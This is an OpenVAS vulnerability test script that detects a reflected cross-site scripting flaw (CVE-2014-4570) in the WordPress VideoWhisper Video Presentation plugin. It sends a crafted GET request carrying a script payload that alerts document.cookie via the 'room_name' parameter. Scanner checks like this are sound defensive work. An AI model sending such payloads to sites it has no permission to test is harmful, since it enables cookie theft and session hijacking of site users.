###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp_videowhisper_video_present_xss_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# WordPress VideoWhisper Video Presentation Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804754");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2014-4570");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-08-26 15:03:45 +0530 (Tue, 26 Aug 2014)");
  script_name("WordPress VideoWhisper Video Presentation Cross Site Scripting Vulnerability");


  script_tag(name:"summary", value:"This host is installed with WordPress VideoWhisper Video Presentation Plugin
and is prone to cross site scripting vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.");
  script_tag(name:"insight", value:"Input passed via the HTTP GET parameter 'room_name' to vp/c_login.php script
and 'room' to vp/index.php are not properly sanitised before returning to
the user.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.");
  script_tag(name:"affected", value:"WordPress VideoWhisper Video Presentation version 3.25, and possibly prior.");
  script_tag(name:"solution", value:"Upgrade to version 3.31 or later.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://codevigilant.com/disclosure/wp-plugin-videowhisper-video-presentation-a3-cross-site-scripting-xss");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://wordpress.org/plugins/videowhisper-video-presentation");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + "/wp-content/plugins/videowhisper-video-presentation/vp/c_login.php?"
          + "room_name=room_name'><script>alert(document.cookie)</script>";

## Extra Check is not possible
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document.cookie\)</script>"))
{
  security_message(http_port);
  exit(0);
}
